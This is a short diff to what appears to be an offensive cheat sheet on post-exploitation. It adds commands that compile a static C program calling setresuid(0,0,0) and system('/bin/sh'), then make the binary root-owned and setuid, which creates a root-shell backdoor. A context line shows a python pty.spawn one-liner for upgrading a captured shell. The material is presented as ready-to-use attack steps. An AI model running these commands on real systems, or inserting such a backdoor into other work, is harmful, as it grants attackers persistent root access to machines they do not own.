@@ -5,6 +5,14 @@
 
 SUID binaries
 
+   printf 'int main(void){\nsetresuid(0,0,0);\nsetregid(0,0,0);\nsystem("/bin/sh");\n}' > /tmp/suid.c
+   gcc -static -O3 -o suid suid.c
+   strip suid
+   chown root:root suid
+   chmod a+s suid
+
+A simple suid binary that runs a shell.
+
 ==== TTYs
 
   python -c 'import pty; pty.spawn("/bin/bash")'
